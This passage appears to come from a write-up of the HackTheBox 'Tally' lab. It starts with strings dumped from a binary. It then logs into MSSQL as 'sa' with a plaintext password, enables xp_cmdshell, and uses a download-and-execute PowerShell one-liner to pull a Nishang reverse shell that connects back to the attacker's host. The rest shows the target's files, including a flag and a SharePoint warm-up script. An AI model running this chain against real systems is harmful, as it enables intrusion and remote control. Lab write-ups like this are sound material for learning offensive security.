.data$r
.bss
ODBC32.dll
WideCharToMultiByte
GetLastError
EnterCriticalSection
LeaveCriticalSection
DeleteCriticalSection
MultiByteToWideChar
EncodePointer
DecodePointer
SetLastError
InitializeCriticalSectionAndSpinCount
CreateEventW
Sleep
TlsAlloc
TlsGetValue
TlsSetValue
TlsFree
GetSystemTimeAsFileTime
GetModuleHandleW
GetProcAddress
CompareStringW
LCMapStringW
GetLocaleInfoW
GetStringTypeW
GetCPInfo
CloseHandle
SetEvent
ResetEvent
WaitForSingleObjectEx
IsDebuggerPresent
UnhandledExceptionFilter
SetUnhandledExceptionFilter
GetStartupInfoW
IsProcessorFeaturePresent
GetCurrentProcess
TerminateProcess
QueryPerformanceCounter
GetCurrentProcessId
GetCurrentThreadId
InitializeSListHead
KERNEL32.dll
RaiseException
RtlUnwind
FreeLibrary
LoadLibraryExW
HeapAlloc
HeapFree
HeapReAlloc
GetStdHandle
WriteFile
GetModuleFileNameA
ExitProcess
GetModuleHandleExW
GetCommandLineA
GetCommandLineW
GetACP
GetFileType
IsValidLocale
GetUserDefaultLCID
EnumSystemLocalesW
GetProcessHeap
FlushFileBuffers
GetConsoleCP
GetConsoleMode
ReadFile
SetFilePointerEx
FindClose
FindFirstFileExA
FindNextFileA
IsValidCodePage
GetOEMCP
GetEnvironmentStringsW
FreeEnvironmentStringsW
SetEnvironmentVariableA
SetStdHandle
ReadConsoleW
HeapSize
CreateFileW
WriteConsoleW
Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.

abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ

abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
.?AVruntime_error@std@@
.?AVexception@std@@
.?AVfailure@ios_base@std@@
.?AVsystem_error@std@@
.?AV_System_error@std@@
.?AVbad_cast@std@@
.?AV_Facet_base@std@@
.?AVfacet@locale@std@@
.?AU_Crt_new_delete@std@@
.?AUctype_base@std@@
.?AV?$ctype@D@std@@
.?AVerror_category@std@@
.?AV_Generic_error_category@std@@
.?AV_Iostream_error_category@std@@
.?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@
.?AV?$numpunct@D@std@@
.?AVbad_alloc@std@@
.?AVlogic_error@std@@
.?AVlength_error@std@@
.?AVout_of_range@std@@
.?AV_Locimp@locale@std@@
.?AVios_base@std@@
.?AV?$_Iosb@H@std@@
.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
.?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
.?AVcodecvt_base@std@@
.?AV?$codecvt@DDU_Mbstatet@@@std@@
.?AVtype_info@@
.?AVbad_array_new_length@std@@
.?AVbad_exception@std@@
0&020<0H0T0d0i0s0
1D1P1\1a1
2M3V3b3n3
8 8-82878M8
0a0i0
0!1)1x1
4<5I5
7,7|7
8D8x8
8H9}9
<<=\=
=F?Y?
5Z6G:`:V;g;
3,494X4e4
5'6A6
6b7W8
8v9~9
:%:=:C:X:w:
>>>L>
0"0'0T0
1]1e1k1z1
2_2t2y2
3:3c3r3
4.4;4S4
5,5u5
696F6_6
8F:O:Z;
>A>K>
?+?5?
4\5,6
7#7)70777=7B7H7N7T7Y7_7e7k7p7v7|7
8#8(8.848:8?8E8K8Q8V8\8b8h8m8s8y8
9 9%9+91979<9B9H9N9S9Y9_9e9j9p9v9|9
:":(:.:4:9:?:E:K:P:V:\:b:g:m:s:y:~:
;Q;_;e;
;$<*<
= =c=
? ?%?:?@?E?P?_?i?w?
0"0(0.080B0M0W0\0|0
4!4-4=4N4d4{4
5$5K5S5l5
6F6X7p7v7
9M9Z9c9n9u9
:&:0:@:P:`:i:
;#;-;@;E;f;u;~;
<,<R<[<a<i<n<
< =.=I=T=
=5>I>P>
2K2P2T2X2\2
5%535
7$7(7,707
;,<}<
=7A7E7I7M7Q7U7Y7]7a7e7i7m7q7u7y7}7
8&8<8b8
999B9G9L9p9|9
9-:5:::J:T:y:
=!='=B=j=~=
;=;B;
=$=+=1=\=e=
=F>c>o>
+0H0S0
8$8v9
:#:':	?%?)?-?1?5?9?=?A?E?I?M?Q?
7/7\7c7n7|7
8W9p9
;;>E>O>x>
2 2/2=2I2U2c2s2
3!3}3
:	:-:N:P;
2:3@3R3
3M4S4
;';4;
1-2a3w3
414=4E4]4
4S5\5
969`9
:!:,:7:D:R:d:
;C;P;_;t;
<#=5===G=P=a=s=
=I>U>Z>`>e>m>s>{>
0-050=0-1
172W3
92:w:
>;?C?
0B0K0S0
1<2[2
3*3Z3
4'4=4P4
5*5/5
3#303K3W3b3
4(454\4q4
6E:H;Y;<=G=W=
8#9*9:9I9P9h9o9
=G=~=
=A>Q>v>
?&?>?C?H?X?]?b?r?w?|?
0*0/040D0I0N0s0
121:1r1
292]2{2
393D3I3N3i3s3
4"4>4c4x4
5-5I5e5|5
5"6F6b6
7/7A7M7Z7a7k7|7N8
2(2a2
314R4Y4o4
586u6
6*7?7P7
808O8
9:9t9
9-:d:
:O;x;
;=<f<
<4=b=
172E3w3
3|4y5
5-6B6
:.:U:
<l<s<z<
=\>e>}>
>D?f?
$0)0S0[0
1#1A1M1c1l1u1
1$2^2r2
3N4_4
4$5H5Q5\5
5+6k6r6
9E9{:
;1<h<
>	?&?6?
1%161u1
2L4X4g4r4v4
: ;?;b;
?H?T?f?
0(030N0
2C3P3
6$7>7z7
8&8<8w8~8
8&989J9\9n9
9=:&=
>#>_>
$0+030;0C0
9P::=
0t0k1
182A2
233<3
8,949~9
97:F:
:T;x;
+2o5
637S7
8S9g9
<(<f<y<
<S=k=
0=0T0}0
1[1w1
7*858@8F8O8
9+9V9n9
:W:7<g<
6-7G7T7
9,9=9U9[9g9
<M=)>1>9>A>I>g>o>
>	?)?p?
2;2O2U2
:2:R:m:
;(;C;^;
< <*<4<><H<R<\<f<
`1h1l1p1t1x1|1
3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
4T4X4\4`4d4h4l4p4t4x4|4
5 5$5(5,5054585<5@5D5
8$8,848<8D8L8T8\8d8l8t8|8
9$9,949<9D9L9T9\9d9l9t9|9
D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
1L6T6\6d6l6t6|6
7$7,747<7D7L7T7\7d7l7t7|7
8$8,848<8D8L8T8\8d8l8t8|8
9$9,949<9D9L9T9\9d9l9t9|9
:$:,:4:<:D:L:T:\:d:l:t:|:
;$;,;4;<;D;L;T;\;d;l;t;|;
<$<,<4<<<D<L<T<\<d<l<t<|<
=$=,=4=<=D=L=T=\=d=h=p=x=
> >(>0>8>@>H>P>X>`>h>p>x>
? ?(?0?8?@?H?P?X?`?h?p?x?
0 0(00080@0H0P0X0`0h0p0x0
1 1(10181@1H1P1X1`1h1p1x1
2 2(20282@2H2P2X2`2h2p2x2
3 3(30383@3H3P3X3`3h3p3x3
4 4(40484@4H4P4X4`4h4p4x4
\6`6d6h6l6
8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
9 9$9(9,9094989<9@9
3(50585<5@5D5H5L5P5T5\5`5d5h5l5p5t5x5
6$6,646<6D6L6T6\6d6l6t6|6
; ;$;(;,;0;4;8;<;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<
:3>3B3F3
3X=d=p=|=
>$>0><>H>T>`>l>x>
? ?,?8?D?P?\?h?t?
0(040@0L0X0h0t0
1(141@1L1X1d1p1
2$2,242<2D2L2T2\2d2l2t2|2
3$3,343<3D3L3T3\3d3l3t3|3
4$4,444<4D4L4T4\4d4l4t4|4
5$5,545<5D5L5T5\5d5l5t5|5
6$6,646<6D6L6T6\6d6l6t6|6
7$7,747<7D7L7T7\7d7l7t7|7
8$8,848<8D8L8T8\8d8l8t8|8
9 9(90989@9H9P9X9`9h9p9x9
: :(:0:8:@:H:P:X:`:h:p:x:
; ;(;0;8;@;H;P;X;`;h;p;x;
< <(<0<8<@<H<P<X<`<h<p<x<
= =(=0=8=@=H=P=X=`=h=p=x=
> >(>0>8>@>H>P>X>`>h>p>x>
? ?(?0?8?@?H?P?X?`?h?p?x?
343D3H3X3\3`3h3
404@4D4H4L4T4l4|4
5,5054585<5@5H5`5p5t5
6 6$6(6,646L6\6`6p6t6x6
7 7(7@7P7T7d7h7l7p7t7|7
848D8H8X8\8`8h8
9 90949D9H9L9P9T9\9t9
: :$:4:8:<:@:H:`:p:t:
; ;$;(;,;0;8;P;`;d;t;x;|;
<4<D<H<X<\<d<|<
181D1L1l1
2@2L2T2t2
3 3(3,3034383@3T3\3p3x3
4 4(4044484@4T4\4d4l4p4t4|4
5 5@5L5l5x5
6(6\6`6|6
7 7$7@7H7L7\7
888X8x8
989X9x9
:8:X:x:
;8;X;x;
<8<X<x<
1 202@2P2`2x2
2p3t3
:0:P:l:
;0;\;
<8<X<x<
>$>L>
root@kali:/mnt/smb/zz_Migration/Binaries/New folder#
```

###### Interactive database shell

```sh
root@kali:/mnt/smb/zz_Migration/Binaries/New folder# sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
sqsh-2.1.7 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2010 Michael Peppler
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
2> EXEC SP_CONFIGURE 'show advanced options',1
3> EXEC SP_CONFIGURE 'xp_cmdshell', 1
4> reconfigure
5> go
1> xp_cmdshell 'whoami'
2> go

	output



	----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------

	tally\sarah



	NULL



(2 rows affected, return status = 0)
1>
2> xp_cmdshell 'whoami /priv'
3> go

	output



	----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------

	NULL



	PRIVILEGES INFORMATION



	----------------------



	NULL



	Privilege Name                Description                               State



	============================= ========================================= ========



	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled



	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled



	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled



	SeImpersonatePrivilege        Impersonate a client after authentication Enabled



	SeCreateGlobalPrivilege       Create global objects                     Enabled



	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled



	NULL



(13 rows affected, return status = 0)
1>
```

###### Reverse Shell 1 using sqsh and xp_cmdshell

[`Invoke-PowerShellTcp.ps1`](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)

```sh
root@kali:~/tally# wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2018-05-31 17:47:23--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.52.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.52.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1                           100%[================================================================================================================>]   4.24K  --.-KB/s    in 0s

2018-05-31 17:47:23 (27.5 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]

root@kali:~/tally#
```

```sh
root@kali:~/tally# tail Invoke-PowerShellTcp.ps1
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9001
root@kali:~/tally#
```

```sh
root@kali:~/tally/www# mv Invoke-PowerShellTcp.ps1 rev-9001.ps1
```

```sh
1> EXEC SP_CONFIGURE 'show advanced options',1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.16/rev-9001.ps1')"
2> go
```

```sh
root@kali:~/tally/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [31/May/2018 18:04:55] "GET /rev-9001.ps1 HTTP/1.1" 200 -
```

```sh
root@kali:~/tally/www# nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.59] 51367
Windows PowerShell running as user Sarah on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
tally\sarah
PS C:\Windows\system32> cd C:\Users\sarah
PS C:\Users\sarah> dir


    Directory: C:\Users\sarah


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       31/08/2017     22:57                Contacts
d-r---       29/05/2018     09:45                Desktop
d-r---       13/10/2017     21:38                Documents
d-r---       01/10/2017     20:34                Downloads
d-r---       31/08/2017     22:57                Favorites
d-r---       31/08/2017     22:57                Links
d-r---       31/08/2017     22:57                Music
d-r---       31/08/2017     22:57                Pictures
d-r---       31/08/2017     22:57                Saved Games
d-r---       31/08/2017     22:57                Searches
d-r---       31/08/2017     22:57                Videos


PS C:\Users\sarah> cd Desktop
PS C:\Users\sarah\Desktop> dir


    Directory: C:\Users\sarah\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       01/10/2017     22:32            916 browser.bat
-a----       17/09/2017     21:50            845 FTP.lnk
-a----       23/09/2017     21:11            297 note to tim (draft).txt
-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
-a----       17/09/2017     21:48           1914 SQLCMD.lnk
-a----       21/09/2017     00:46            129 todo.txt
-ar---       31/08/2017     02:04             32 user.txt
-a----       17/09/2017     21:49            936 zz_Migration.lnk


PS C:\Users\sarah\Desktop> cat user.txt
be72362e8dffeca2b42406d5d1c74bb1
PS C:\Users\sarah\Desktop> cat browser.bat

del C:\Users\Sarah\Desktop\session_id.txt

REM output current session information to file
qwinsta | findstr ">" > C:\Users\Sarah\Desktop\session_id.txt

REM query file for session id
FOR /F "tokens=3" %%a IN (C:\Users\Sarah\Desktop\session_id.txt) DO SET sessionid=%%a

del C:\Users\Sarah\Desktop\session_id.txt

REM only if console user, enter loop
if %sessionid% EQU 1 goto LOOP
if %sessionid% GTR 1 goto EXIT

:LOOP

REM kill any open instances of firefox and crashreporter
taskkill /F /IM firefox.exe > nul 2>&1
taskkill /F /IM crashreporter.exe > nul 2>&1

REM copy latest mockups to webroot
copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html

REM browse file
start "" "C:\Program Files (x86)\Mozilla Firefox\Firefox.exe" "http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html"

REM wait
ping 127.0.0.1 -n 80 > nul

if not ErrorLevel 1 goto :LOOP

:EXIT
exit
PS C:\Users\sarah\Desktop>
PS C:\Users\sarah\Desktop> cat "note to tim (draft).txt"
Hi Tim,

As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.

Thanks,
Sarah
PS C:\Users\sarah\Desktop> cat SPBestWarmUp.ps1
<#
.SYNOPSIS
	Warm up SharePoint IIS W3WP memory cache by loading pages from WebRequest

.DESCRIPTION
	Loads the full page so resources like CSS, JS, and images are included. Please modify lines 374-395 to suit your portal content design (popular URLs, custom pages, etc.)

	Comments and suggestions always welcome!  Please, use the issues panel at the project page.

.PARAMETER url
	A collection of url that will be added to the list of websites the script will fetch.

.PARAMETER install
	Typing "SPBestWarmUp.ps1 -install" will create a local Task Scheduler job under credentials of the current user. Job runs every 60 minutes on the hour to help automatically populate cache. Keeps cache full even after IIS daily recycle, WSP deployment, reboot, or other system events.

.PARAMETER installfarm
	Typing "SPBestWarmUp.ps1 -installfarm" will create a Task Scheduler job on all machines in the farm.

.PARAMETER uninstall
	Typing "SPBestWarmUp.ps1 -uninstall" will remove Task Scheduler job from all machines in the farm.

.PARAMETER user
	Typing "SPBestWarmUp.ps1 -user" provides the user name that will be used for the execution of the Task Scheduler job. If this parameter is missing it is assumed that the Task Scheduler job will be run with the current user.

.PARAMETER skiplog
	Typing "SPBestWarmUp.ps1 -skiplog" will avoid writing to the EventLog.

.PARAMETER allsites
	Typing "SPBestWarmUp.ps1 -allsites" will load every site and web URL. If the parameter skipsubwebs is used, only the root web of each site collection will be processed.

.PARAMETER skipsubwebs
	Typing "SPBestWarmUp.ps1 -skipsubwebs" will skip the subwebs of each site collection and only process the root web of the site collection.

.PARAMETER skipadmincheck
	Typing "SPBestWarmUp.ps1 -skipadmincheck" will skip checking of the current user is a local administrator. Local administrator rights are necessary for the installation of the Windows Task Scheduler but not necessary for simply running the warmup script.

.EXAMPLE
	.\SPBestWarmUp.ps1 -url "http://domainA.tld","http://domainB.tld"

.EXAMPLE
	.\SPBestWarmUp.ps1 -i
	.\SPBestWarmUp.ps1 -install

.EXAMPLE
	.\SPBestWarmUp.ps1 -f
	.\SPBestWarmUp.ps1 -installfarm

.EXAMPLE
	.\SPBestWarmUp.ps1 -f -user "Contoso\JaneDoe"
	.\SPBestWarmUp.ps1 -installfarm -user "Contoso\JaneDoe"

.EXAMPLE
	.\SPBestWarmUp.ps1 -u
	.\SPBestWarmUp.ps1 -uninstall


.NOTES
	File Name:  SPBestWarmUp.ps1
	Author   :  Jeff Jones  - @spjeff
	Author   :  Hagen Deike - @hd_ka
	Author   :  Lars Fernhomberg
	Author   :  Charles Crossan - @crossan007
	Author   :  Leon Lennaerts - SPLeon
	Version  :  2.4.16
	Modified :  2017-07-13

.LINK
	https://github.com/spjeff/spbestwarmup
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$false, HelpMessage='A collection of URLs that will be fetched too')]
    [Alias("url")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("https?:\/\/\D+")]
    [string[]]$cmdurl,

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$false, HelpMessage='Use -install -i parameter to add script to Windows Task Scheduler on local machine')]
    [Alias("i")]
    [switch]$install,

    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$false, HelpMessage='Use -installfarm -f parameter to add script to Windows Task Scheduler on all farm machines')]
    [Alias("f")]
    [switch]$installfarm,

    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$false, HelpMessage='Use -uninstall -u parameter to remove Windows Task Scheduler job')]
    [Alias("u")]
    [switch]$uninstall,

	[Parameter(Mandatory=$False, Position=4, ValueFromPipeline=$false, HelpMessage='Use -user to provide the login of the user that will be used to run the script in the Windows Task Scheduler job')]
	[string]$user,

	[Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$false, HelpMessage='Use -skiplog -sl parameter to avoid writing to Event Log')]
	[Alias("sl")]
	[switch]$skiplog,

	[Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$false, HelpMessage='Use -allsites -all parameter to load every site and web (if skipsubwebs parameter is also given, only the root web will be processed)')]
	[Alias("all")]
	[switch]$allsites,

	[Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$false, HelpMessage='Use -skipsubwebs -sw parameter to skip subwebs of each site collection and to process only the root web')]
	[Alias("sw")]
	[switch]$skipsubwebs,

	[Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$false, HelpMessage='Use -skipadmincheck -sac parameter to skip checking if the current user is an administrator')]
	[Alias("sac")]
	[switch]$skipadmincheck,

	[Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$false, HelpMessage='Use -skipserviceapps -ssa parameter to skip warmin up of Service Application Endpoints URLs')]
	[Alias("ssa")]
	[switch]$skipserviceapps
)

Function Installer() {
	# Add to Task Scheduler
	Write-Output "  Installing to Task Scheduler..."
	if(!$user) {
		$user = $ENV:USERDOMAIN + "\"+$ENV:USERNAME
	}
	Write-Output "  User for Task Scheduler job: $user"

    # Attempt to detect password from IIS Pool (if current user is local admin and farm account)
    $appPools = Get-WMIObject -Namespace "root/MicrosoftIISv2" -Class "IIsApplicationPoolSetting" | Select-Object WAMUserName, WAMUserPass
    foreach ($pool in $appPools) {
        if ($pool.WAMUserName -like $user) {
            $pass = $pool.WAMUserPass
            if ($pass) {
                break
            }
        }
    }

    # Manual input if auto detect failed
    if (!$pass) {
        $pass = Read-Host "Enter password for $user "
    }

	# Task Scheduler command
	$suffix += " -skipadmincheck"	#We do not need administrative rights on local machines to check the farm
	if ($allsites) {$suffix += " -allsites"}
	if ($skipsubwebs) {$suffix += " -skipsubwebs"}
	if ($skiplog) {$suffix += " -skiplog"}
	$cmd = "-ExecutionPolicy Bypass -File SPBestWarmUp.ps1" + $suffix

	# Target machines
	$machines = @()
	if ($installfarm -or $uninstall) {
		# Create farm wide on remote machines
		foreach ($srv in (Get-SPServer | Where-Object {$_.Role -ne "Invalid"})) {
			$machines += $srv.Address
		}
	} else {
		# Create local on current machine
		$machines += "localhost"
	}
	$machines | ForEach-Object {
		if ($uninstall) {
			# Delete task
			Write-Output "SCHTASKS DELETE on $_"
			schtasks /s $_ /delete /tn "SPBestWarmUp" /f
			WriteLog "  [OK]" Green
		} else {
			$xmlCmdPath = $cmdpath.Replace(".ps1", ".xml")
			# Ensure that XML file is present
			if(!(Test-Path $xmlCmdPath)) {
				Write-Warning """$($xmlCmdPath)"" is missing. Cannot create timer job without missing file."
				return
			}

			# Update xml file
			Write-Host "xmlCmdPath - $xmlCmdPath"
			$xml = [xml](Get-Content $xmlCmdPath)
			$xml.Task.Principals.Principal.UserId = $user
			$xml.Task.Actions.Exec.Arguments = $cmd
			$xml.Task.Actions.Exec.WorkingDirectory = (Split-Path ($xmlCmdPath)).ToString()
			$xml.Save($xmlCmdPath)

			# Copy local file to remote UNC path machine
			Write-Output "SCHTASKS CREATE on $_"
			if ($_ -ne "localhost" -and $_ -ne $ENV:COMPUTERNAME) {
				$dest = $cmdpath
				$drive = $dest.substring(0,1)
				$match =  Get-WMIObject -Class Win32_LogicalDisk | Where-Object {$_.DeviceID -eq ($drive+":") -and $_.DriveType -eq 3}
				if ($match) {
					$dest = "\\" + $_ + "\" + $drive + "$" + $dest.substring(2,$dest.length-2)
					$xmlDest = $dest.Replace(".ps1", ".xml")
					mkdir (Split-Path $dest) -ErrorAction SilentlyContinue | Out-Null
					Write-Output $dest
					Copy-Item $cmdpath $dest -Confirm:$false
					Copy-Item $xmlCmdPath $xmlDest -Confirm:$false
				}
			}
			# Create task
			schtasks /s $_ /create /tn "SPBestWarmUp" /ru $user /rp $pass /xml $xmlCmdPath
			WriteLog "  [OK]"  Green
		}
	}
}

Function WarmUp() {
    # Load plugin
    Add-PSSnapIn Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue

    # Warm up CMD parameter URLs
    $cmdurl | ForEach-Object {NavigateTo $_}

    # Warm up SharePoint web applications
    Write-Output "Opening Web Applications..."

	# Accessing the Alternate URls to warm up all "extended webs" (i.e. multiple IIS websites exists for one SharePoint webapp)
	$was = Get-SPWebApplication -IncludeCentralAdministration
	foreach ($wa in $was) {
		foreach ($alt in $wa.AlternateUrls) {
			$url = $alt.PublicUrl
			if(!$url.EndsWith("/")) {
				$url = $url + "/"
			}
			NavigateTo $url
			NavigateTo $url"_api/web"
			NavigateTo $url"_api/_trust" # for ADFS, first user login
			NavigateTo $url"_layouts/viewlsts.aspx"
			NavigateTo $url"_vti_bin/UserProfileService.asmx"
			NavigateTo $url"_vti_bin/sts/spsecuritytokenservice.svc"
			NavigateTo $url"_api/search/query?querytext='warmup'"
		}

		# Warm Up Individual Site Collections and Sites
		if ($allsites) {
 			$sites = (Get-SPSite -WebApplication $wa -Limit ALL)
 			foreach($site in $sites) {
				if($skipsubwebs)
				{
					$url = $site.RootWeb.Url
					NavigateTo $url
				}
				else
				{
					$webs = (Get-SPWeb -Site $site -Limit ALL)
					foreach($web in $webs){
						$url = $web.Url
						NavigateTo $url
					}
				}
 			}
		}

        # Central Admin
        if ($wa.IsAdministrationWebApplication) {
            $url = $wa.Url
            NavigateTo $url"Lists/HealthReports/AllItems.aspx"
            NavigateTo $url"_admin/FarmServers.aspx"
            NavigateTo $url"_admin/Server.aspx"
            NavigateTo $url"_admin/WebApplicationList.aspx"
            NavigateTo $url"_admin/ServiceApplications.aspx"

            # Manage Service Application
            $sa = Get-SPServiceApplication
            $links = $sa | ForEach-Object {$_.ManageLink.Url} | Select-Object -Unique
            foreach ($link in $links) {
                $ml = $link.TrimStart('/')
                NavigateTo "$url$ml"
            }
        }
    }

    # Warm up Service Applications
	if (!$skipserviceapps) {
    	Get-SPServiceApplication | ForEach-Object {$_.EndPoints | ForEach-Object {$_.ListenUris | ForEach-Object {NavigateTo $_.AbsoluteUri}}}
	}

    # Warm up Project Server
    Write-Output "Opening Project Server PWAs..."
    if ((Get-Command Get-SPProjectWebInstance -ErrorAction SilentlyContinue).Count -gt 0) {
        Get-SPProjectWebInstance | ForEach-Object {
            # Thanks to Eugene Pavlikov for the snippet
            $url = ($_.Url).AbsoluteUri + "/"

            NavigateTo $url
            NavigateTo ($url + "_layouts/viewlsts.aspx")
            NavigateTo ($url + "_vti_bin/UserProfileService.asmx")
            NavigateTo ($url + "_vti_bin/sts/spsecuritytokenservice.svc")
            NavigateTo ($url + "Projects.aspx")
            NavigateTo ($url + "Approvals.aspx")
            NavigateTo ($url + "Tasks.aspx")
            NavigateTo ($url + "Resources.aspx")
            NavigateTo ($url + "ProjectBICenter/Pages/Default.aspx")
            NavigateTo ($url + "_layouts/15/pwa/Admin/Admin.aspx")
        }
    }

    # Warm up Topology
    NavigateTo "http://localhost:32843/Topology/topology.svc"

    # Warm up Host Name Site Collections (HNSC)
    Write-Output "Opening Host Name Site Collections (HNSC)..."
    $hnsc = Get-SPSite -Limit All | Where-Object {$_.HostHeaderIsSiteName -eq $true} | Select-Object Url
    foreach ($sc in $hnsc) {
        NavigateTo $sc.Url
    }

	# Warm up Office Online Server (OOS)
	$remoteuis = "m,o,oh,op,p,we,wv,x".Split(",")
	$services = "diskcache/DiskCache.svc,dss/DocumentSessionService.svc,ecs/ExcelService.asmx,farmstatemanager/FarmStateManager.svc,metb/BroadcastStateService.svc,pptc/Viewing.svc,ppte/Editing.svch,wdss/WordDocumentSessionService.svc,wess/WordSaveService.svc,wvc/Conversion.svc".Split(",")

	# Loop per WOPI
	$wopis = Get-SPWOPIBinding | Select-Object ServerName -Unique
	foreach ($w in $wopis.ServerName) {
		foreach ($r in $remoteuis) {
			NavigateTo "http://$w/$r/RemoteUIs.ashx"
			NavigateTo "https://$w/$r/RemoteUIs.ashx"
		}
		foreach ($s in $services) {
			NavigateTo "http://$w"+":809/$s/"
			NavigateTo "https://$w"+":810/$s/"
		}
	}
}

Function NavigateTo([string] $url) {
	if ($url.ToUpper().StartsWith("HTTP") -and !$url.EndsWith("/ProfileService.svc","CurrentCultureIgnoreCase")) {
		WriteLog "  $url" -NoNewLine
		# WebRequest command line
		try {
			$wr = Invoke-WebRequest -Uri $url -UseBasicParsing -UseDefaultCredentials -TimeoutSec 120
			FetchResources $url $wr.Images
			FetchResources $url $wr.Scripts
			Write-Host "."
		} catch {
			$httpCode = $_.Exception.Response.StatusCode.Value__
			if ($httpCode) {
				WriteLog "   [$httpCode]" Yellow
			} else {
				Write-Host " "
			}
		}
	}
}

Function FetchResources($baseUrl, $resources) {
    # Download additional HTTP files
    [uri]$uri = $baseUrl
    $rootUrl = $uri.Scheme + "://" + $uri.Authority

    # Loop
    $counter = 0
    foreach ($res in $resources) {
        # Support both abosolute and relative URLs
        $resUrl  = $res.src
        if ($resUrl.ToUpper().Contains("HTTP")) {
            $fetchUrl = $res.src
        } else {
            if (!$resUrl.StartsWith("/")) {
                $resUrl = "/" + $resUrl
            }
            $fetchUrl = $rootUrl + $resUrl
        }

        # Progress
        Write-Progress -Activity "Opening " -Status $fetchUrl -PercentComplete (($counter/$resources.Count)*100)
        $counter++

        # Execute
        Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $fetchUrl -TimeoutSec 120 | Out-Null
        Write-Host "." -NoNewLine
    }
    Write-Progress -Activity "Completed" -Completed
}

Function ShowW3WP() {
    # Total memory used by IIS worker processes
    $mb = [Math]::Round((Get-Process W3WP -ErrorAction SilentlyContinue | Select-Object workingset64 | Measure-Object workingset64 -Sum).Sum/1MB)
    WriteLog "Total W3WP = $mb MB" "Green"
}

Function CreateLog() {
    # EventLog - create source if missing
    if (!(Get-EventLog -LogName Application -Source "SPBestWarmUp" -ErrorAction SilentlyContinue)) {
        New-EventLog -LogName Application -Source "SPBestWarmUp" -ErrorAction SilentlyContinue | Out-Null
    }
}

Function WriteLog($text, $color) {
    $global:msg += "`n$text"
    if ($color) {
        Write-Host $text -Fore $color
    } else {
        Write-Output $text
    }
}

Function SaveLog($id, $txt, $error) {
    # EventLog
    if (!$skiplog) {
        if (!$error) {
            # Success
            $global:msg += $txt
            Write-EventLog -LogName Application -Source "SPBestWarmUp" -EntryType Information -EventId $id -Message $global:msg
        } else {
            # Error
			$global:msg += "ERROR`n"
